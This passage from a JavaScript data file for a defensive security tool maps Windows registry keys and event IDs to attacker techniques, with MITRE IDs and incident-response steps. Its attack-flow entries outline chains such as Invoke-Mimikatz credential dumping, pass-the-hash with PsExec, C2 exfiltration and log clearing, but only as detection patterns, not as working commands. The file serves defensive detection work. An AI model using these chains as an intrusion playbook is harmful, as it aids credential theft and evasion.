    relatedSigmaRules: ['sigma-defender-disabled', 'sigma-defender-exclusion'],
    relatedIRSteps: [
      'Re-enable Windows Defender immediately',
      'Check for exclusion paths added by attacker',
      'Scan system with alternative AV tool',
      'Determine how Defender was disabled (GPO, registry, PowerShell)',
      'Investigate what was executed while Defender was off'
    ]
  },

  // ── Autoruns ──
  {
    id: 'REG-012',
    registryPath: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders',
    description: 'Defines paths for special shell folders including Startup folder. Modifying the Startup path allows redirecting autostart to attacker-controlled directory.',
    purpose: 'Autoruns',
    category: 'autoruns',
    detectionRelevance: 'Common Startup should be C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. Any change to this path redirects startup items to attacker-controlled location.',
    severity: 'high',
    mitreTechnique: { id: 'T1547.001', name: 'Boot or Logon Autostart Execution: Registry Run Keys' },
    relatedSigmaRules: ['sigma-startup-folder-modification'],
    relatedIRSteps: [
      'Verify the Startup path matches the system default',
      'Check the modified Startup directory for malicious files',
      'Restore the path to the default value',
      'Scan modified directory location for malware'
    ]
  },
  {
    id: 'REG-013',
    registryPath: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks',
    description: 'Contains definitions for all scheduled tasks. Attackers create or modify scheduled tasks for persistence and recurring payload execution.',
    purpose: 'Autoruns',
    category: 'autoruns',
    detectionRelevance: 'Compare against baseline. New tasks with suspicious paths (temp, AppData, encoded commands) are high-priority. Cross-reference with Scheduled Task creation events (4698).',
    severity: 'high',
    mitreTechnique: { id: 'T1053.005', name: 'Scheduled Task/Job: Scheduled Task' },
    relatedSigmaRules: ['sigma-scheduled-task-registry', 'sigma-suspicious-scheduled-task'],
    relatedIRSteps: [
      'Enumerate all scheduled tasks and compare to baseline',
      'Identify tasks executing from suspicious locations',
      'Check task creation timestamps for correlation with incidents',
      'Disable and delete malicious scheduled tasks',
      'Review task history for execution evidence'
    ]
  },

  // ── COM Object Hijacking ──
  {
    id: 'REG-014',
    registryPath: 'HKCU\\Software\\Classes\\CLSID',
    description: 'User-specific COM class registrations. Attackers hijack COM objects by registering malicious DLLs that load when legitimate applications invoke the COM object.',
    purpose: 'Persistence',
    category: 'persistence',
    detectionRelevance: 'Most users have NO entries in HKCU\\..\\CLSID. Any entry is suspicious and likely a COM hijack for persistence. Monitor with Sysmon Event 13 (registry value set).',
    severity: 'high',
    mitreTechnique: { id: 'T1546.015', name: 'Event Triggered Execution: Component Object Model Hijacking' },
    relatedSigmaRules: ['sigma-com-hijacking'],
    relatedIRSteps: [
      'Identify which COM object CLSID was hijacked',
      'Determine which application would load the hijacked COM object',
      'Analyze the malicious DLL loaded via COM hijack',
      'Delete the HKCU CLSID entry to break persistence',
      'Check for additional COM hijacks across the system'
    ]
  },

  // ── LSA Protection ──
  {
    id: 'REG-015',
    registryPath: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa',
    description: 'LSA configuration including RunAsPPL (Protected Process Light), LimitBlankPasswordUse, and security provider settings. Key hardening location.',
    purpose: 'Security Settings',
    category: 'security-settings',
    detectionRelevance: 'RunAsPPL=1 protects LSASS from credential dumping. If RunAsPPL is changed from 1 to 0, attacker is preparing for credential theft. Also monitor for new security packages.',
    severity: 'critical',
    mitreTechnique: { id: 'T1556', name: 'Modify Authentication Process' },
    relatedSigmaRules: ['sigma-lsa-protection-disabled', 'sigma-lsa-security-package'],
    relatedIRSteps: [
      'Verify RunAsPPL value is 1 (enabled)',
      'Check Security Packages and Authentication Packages for unauthorized entries',
      'If RunAsPPL was disabled, assume credential compromise',
      'Re-enable RunAsPPL and reboot the system',
      'Deploy Credential Guard for enhanced protection'
    ]
  }
];

// ══════════════════════════════════════════════
// SECTION 5: ATTACK FLOWS
// ══════════════════════════════════════════════

const ATTACK_FLOWS = [
  {
    id: 'FLOW-001',
    name: 'Brute Force → Account Compromise',
    description: 'Failed login attempts followed by successful logon with privileged access — indicates brute force leading to credential compromise',
    severity: 'critical',
    events: [
      { eventId: '4625', label: 'Multiple Failed Logins', role: 'trigger' },
      { eventId: '4624', label: 'Successful Login', role: 'indicator' },
      { eventId: '4672', label: 'Privileged Logon', role: 'escalation' }
    ],
    mitreTechniques: ['T1110', 'T1078'],
    relatedCategory: 'brute-force',
    attackNarrative: 'Attacker performs password spraying or brute force → gains valid credentials → authenticates with admin privileges → potential domain compromise'
  },
  {
    id: 'FLOW-002',
    name: 'Persistence Installation',
    description: 'Account creation followed by privilege escalation and service/scheduled task installation — classic persistence chain',
    severity: 'critical',
    events: [
      { eventId: '4720', label: 'Account Created', role: 'trigger' },
      { eventId: '4732', label: 'Added to Admins', role: 'escalation' },
      { eventId: '7045', label: 'Service Installed', role: 'persistence' }
    ],
    mitreTechniques: ['T1136', 'T1098', 'T1543.003'],
    relatedCategory: 'persistence',
    attackNarrative: 'Attacker creates local account → adds to Administrators group → installs malicious service for persistence → maintains access through reboots'
  },
  {
    id: 'FLOW-003',
    name: 'PowerShell Attack Chain',
    description: 'Encoded PowerShell execution → download cradle → credential access — full PowerShell-based attack lifecycle',
    severity: 'critical',
    events: [
      { eventId: '4104', label: 'Encoded PS Command', role: 'trigger' },
      { eventId: '4104', label: 'Download Cradle', role: 'delivery' },
      { eventId: 'Sysmon 1', label: 'Suspicious Process', role: 'execution' },
      { eventId: '4104', label: 'Invoke-Mimikatz', role: 'credential-access' }
    ],
    mitreTechniques: ['T1059.001', 'T1027', 'T1003.001'],
    relatedCategory: 'execution',
    attackNarrative: 'Attacker executes encoded PowerShell → downloads payload from C2 → spawns malicious process → dumps credentials with Invoke-Mimikatz'
  },
  {
    id: 'FLOW-004',
    name: 'Lateral Movement via SMB',
    description: 'Authentication with stolen credentials → SMB share access → PsExec service installation — standard lateral movement pattern',
    severity: 'high',
    events: [
      { eventId: '4624', label: 'NTLM Type 3 Logon', role: 'trigger' },
      { eventId: '5145', label: 'Admin Share Access', role: 'movement' },
      { eventId: '7045', label: 'PSEXESVC Installed', role: 'execution' },
      { eventId: 'Sysmon 1', label: 'Remote Process', role: 'objective' }
    ],
    mitreTechniques: ['T1550.002', 'T1021.002', 'T1569.002'],
    relatedCategory: 'lateral-movement',
    attackNarrative: 'Attacker uses Pass-the-Hash for NTLM auth → accesses C$ admin share → PsExec deploys service → executes commands on target system'
  },
  {
    id: 'FLOW-005',
    name: 'Defense Evasion → Evidence Destruction',
    description: 'Audit policy modification followed by log clearing — attacker attempting to cover tracks',
    severity: 'critical',
    events: [
      { eventId: '4719', label: 'Audit Policy Changed', role: 'trigger' },
      { eventId: '1102', label: 'Security Log Cleared', role: 'destruction' }
    ],
    mitreTechniques: ['T1562.002', 'T1070.001'],
    relatedCategory: 'defense-evasion',
    attackNarrative: 'Attacker disables audit logging → clears Security event log → removes evidence of intrusion activities'
  },
  {
    id: 'FLOW-006',
    name: 'C2 Communication Chain',
    description: 'DNS query to suspicious domain → network connection to C2 → data exfiltration — full command & control lifecycle',
    severity: 'critical',
    events: [
      { eventId: 'DNS-001', label: 'Suspicious DNS Query', role: 'trigger' },
      { eventId: 'Sysmon 3', label: 'Outbound Connection', role: 'c2' },
      { eventId: '4663', label: 'Sensitive File Access', role: 'collection' },
      { eventId: 'Sysmon 3', label: 'Large Outbound Transfer', role: 'exfiltration' }
    ],
    mitreTechniques: ['T1071.004', 'T1041', 'T1005'],
    relatedCategory: 'command-control',
    attackNarrative: 'Malware resolves C2 domain via DNS → establishes encrypted connection → accesses sensitive files → exfiltrates data over C2 channel'
  },
  {
    id: 'FLOW-007',
    name: 'Kerberos Attack Chain',
    description: 'AS-REP Roasting / Kerberoasting → credential cracking → domain compromise',
    severity: 'critical',
    events: [
      { eventId: '4769', label: 'TGS Request (RC4)', role: 'trigger' },
      { eventId: '4624', label: 'Service Account Logon', role: 'compromise' },
      { eventId: '4672', label: 'Privileged Access', role: 'escalation' },
      { eventId: '5136', label: 'AD Object Modified', role: 'persistence' }
    ],
    mitreTechniques: ['T1558.003', 'T1078.002', 'T1484'],
    relatedCategory: 'active-directory',
    attackNarrative: 'Attacker requests TGS tickets with RC4 encryption → cracks service account passwords offline → logs on with compromised service account → modifies AD objects for persistence'
  }
];

// ══════════════════════════════════════════════
// HELPER FUNCTIONS
// ══════════════════════════════════════════════

function getEventsByCategory(category) {
  return WINDOWS_EVENT_LOGS.filter(e => e.category === category);
}

function getEventCategories() {
  const cats = [];
  const seen = new Set();
  WINDOWS_EVENT_LOGS.forEach(e => {
    if (!seen.has(e.category)) {
      seen.add(e.category);
      cats.push({ id: e.category, label: e.categoryLabel });
    }
  });
  return cats;
}

function getRegistryByCategory(category) {
  return REGISTRY_INTELLIGENCE.filter(r => r.category === category);
}

function getRegistryCategories() {
  const cats = [];
  const seen = new Set();
  REGISTRY_INTELLIGENCE.forEach(r => {
    if (!seen.has(r.category)) {
      seen.add(r.category);
      cats.push({ id: r.category, label: r.purpose });
    }
  });
  return cats;
}

function searchSystemIntelligence(query) {
  const q = query.toLowerCase();
  const results = { events: [], powershell: [], network: [], registry: [], flows: [] };

  results.events = WINDOWS_EVENT_LOGS.filter(e =>
    e.eventId.toLowerCase().includes(q) ||
    e.title.toLowerCase().includes(q) ||
    e.description.toLowerCase().includes(q) ||
    e.relatedAttackType.toLowerCase().includes(q) ||
    e.mitreTechniques.some(t => t.id.toLowerCase().includes(q) || t.name.toLowerCase().includes(q))
  );

  results.powershell = POWERSHELL_INTELLIGENCE.filter(p =>
    p.name.toLowerCase().includes(q) ||
    p.pattern.toLowerCase().includes(q) ||
    p.suspiciousBehavior.toLowerCase().includes(q)
  );

  results.network = NETWORK_INTELLIGENCE.filter(n =>
    n.name.toLowerCase().includes(q) ||
    n.description.toLowerCase().includes(q) ||
    n.attackType.toLowerCase().includes(q)
  );

  results.registry = REGISTRY_INTELLIGENCE.filter(r =>
    r.registryPath.toLowerCase().includes(q) ||
    r.description.toLowerCase().includes(q) ||
    r.purpose.toLowerCase().includes(q)
  );

  results.flows = ATTACK_FLOWS.filter(f =>
    f.name.toLowerCase().includes(q) ||
    f.description.toLowerCase().includes(q)
  );

  return results;
}

// ── Global Exports ──
window.WINDOWS_EVENT_LOGS = WINDOWS_EVENT_LOGS;
window.POWERSHELL_INTELLIGENCE = POWERSHELL_INTELLIGENCE;
window.NETWORK_INTELLIGENCE = NETWORK_INTELLIGENCE;
window.REGISTRY_INTELLIGENCE = REGISTRY_INTELLIGENCE;
window.ATTACK_FLOWS = ATTACK_FLOWS;
window.getEventsByCategory = getEventsByCategory;
window.getEventCategories = getEventCategories;
window.getRegistryByCategory = getRegistryByCategory;
window.getRegistryCategories = getRegistryCategories;
window.searchSystemIntelligence = searchSystemIntelligence;
